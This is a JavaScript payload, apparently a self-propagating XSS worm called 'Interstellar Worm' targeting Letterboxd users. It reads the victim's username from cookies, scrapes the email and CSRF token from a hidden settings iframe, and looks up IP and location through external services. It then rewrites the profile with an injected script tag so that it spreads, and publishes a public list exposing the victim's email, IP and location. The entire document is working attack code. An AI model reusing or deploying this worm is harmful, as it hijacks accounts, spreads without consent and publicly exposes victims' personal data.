(() => {
  // Récupération du username depuis les cookies
  const username = document.cookie.split('; ')
    .find(row => row.startsWith('letterboxd.signed.in.as='))
    ?.split('=')[1] || 'Unknown';

  let i = document.getElementById('xsrfprobe_iframe');
  if(i) i.remove();
  i = document.createElement('iframe');
  i.style.display = 'none';
  i.src = '/settings';
  i.id = 'xsrfprobe_iframe';
  document.body.appendChild(i);
  
  i.onload = async () => {
    try {
      const d = i.contentDocument || i.contentWindow.document;
      const e = d.querySelector('input[name="emailAddress"]')?.value || '';
      const c = d.querySelector('input[name="__csrf"]')?.value || '';
      const ua = navigator.userAgent;
      
      // Récupération IP + géolocalisation
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const {ip} = await ipResponse.json();
      
      let location = 'Unknown';
      try {
        const geoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=e83c382c926934`);
        const geoData = await geoResponse.json();
        location = `${geoData.country || 'Unknown'}${geoData.region ? ` (${geoData.region})` : ''}`;
      } catch(e) {
        location = ip.startsWith('77') ? 'France' : 'Unknown';
      }

      // Première requête (update profil)
      await fetch('/user/update.do', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `__csrf=${c}&completeSettings=true&givenName="<script src='https://www.paypalobjects.com/martech/tm/paypal/mktconf.js'></script>&familyName=Interstallar+Worm&emailAddress=${encodeURIComponent(e)}&location=Your+ip+is+${ip}&website=your+email+is+${encodeURIComponent(e)}&bio=&pronoun=They&posterMode=All&commentPolicy=Anyone&privacyIncludeInPeopleSection=true&password=&favouriteFilmIds=117621&favouriteFilmIds=117621&favouriteFilmIds=117621&favouriteFilmIds=117621`
      });

      // Formatage de la date/heure
      const now = new Date();
      const infectionTime = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
      
      // Construction du payload
      const updatePayload = `%7B%22version%22%3A%22%22%2C%22name%22%3A%22INTERSTELLAR+WORM+-+INFECTION+REPORT%22%2C%22description%22%3A%22%3Cblockquote%3E%5Cn%3Cstrong%3E%3D%3D%3D+SECURITY+NOTICE+%3D%3D%3D%3C%2Fstrong%3E%3Cbr%3E%3Cbr%3E%5Cn%E2%80%A2+%3Cb%3EUSERNAME%3C%2Fb%3E%3A+${encodeURIComponent(username)}%3Cbr%3E%5Cn%E2%80%A2+%3Cb%3EINFECTION+TIME%3C%2Fb%3E%3A+${encodeURIComponent(infectionTime)}%3Cbr%3E%5Cn%E2%80%A2+%3Cb%3EIP+ADDRESS%3C%2Fb%3E%3A+${encodeURIComponent(ip)}%3Cbr%3E%5Cn%E2%80%A2+%3Cb%3EUSER+EMAIL%3C%2Fb%3E%3A+%3Ci%3E${encodeURIComponent(e)}%3C%2Fi%3E%3Cbr%3E%5Cn%E2%80%A2+%3Cb%3ELOCATION%3C%2Fb%3E%3A+${encodeURIComponent(location)}%3Cbr%3E%3Cbr%3E%5Cn%5Cn%3Cem%3E%3D%3D%3D+WORM+SIGNATURE+%3D%3D%3D%3C%2Fem%3E%3Cbr%3E%3Cbr%3E%5Cn%5CnInterstellar+Worm+%3Cb%3Ev1.0+ALPHA%3C%2Fb%3E%3Cbr%3E%5Cn%3Cstrong%3EPropagation%3C%2Fstrong%3E%3A+%3Ci%3ETrue%3C%2Fi%3E%3Cbr%3E%5Cn%3Cstrong%3EPayload%3C%2Fstrong%3E%3A+%3Ci%3ETrue%3C%2Fi%3E%3Cbr%3E%3Cbr%3E%5Cn%5CnThis+is+an+automated+security+report%2C+%3Cstrong%3Evictim+compromised%3C%2Fstrong%3E.%5Cn%3C%2Fblockquote%3E%22%2C%22tags%22%3A%5B%22interstellar+worm%22%5D%2C%22published%22%3Atrue%2C%22sharePolicy%22%3A%22You%22%2C%22ranked%22%3Afalse%2C%22entries%22%3A%5B%7B%22film%22%3A%224VZ8%22%2C%22action%22%3A%22ADD%22%7D%2C%7B%22action%22%3A%22UPDATE%22%2C%22position%22%3A0%2C%22notes%22%3A%22INTERSTELLAR+WORM%22%2C%22containsSpoilers%22%3Afalse%7D%5D%7D`;

      await fetch('/s/update-list', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest',
          'Origin': 'https://letterboxd.com',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Dest': 'empty',
          'Referer': 'https://letterboxd.com/list/new/',
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'User-Agent': ua,
          'Sec-Ch-Ua': '"Chromium";v="133", "Not(A:Brand";v="99"',
          'Sec-Ch-Ua-Mobile': '?0',
          'Sec-Ch-Ua-Platform': '"Windows"',
          'Accept-Language': 'fr'
        },
        body: `__csrf=${c}&filmListId=&update=${updatePayload}`
      });
    } catch(x){}
  };
})();
